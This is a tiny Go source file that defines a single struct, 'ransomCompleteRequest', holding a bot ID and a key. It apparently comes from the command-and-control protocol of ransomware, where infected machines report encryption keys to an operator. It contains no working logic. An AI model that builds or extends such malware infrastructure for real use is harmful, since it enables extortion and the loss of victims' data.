package tcp

type ransomCompleteRequest struct {
	BotID []byte
	Key   []byte
}
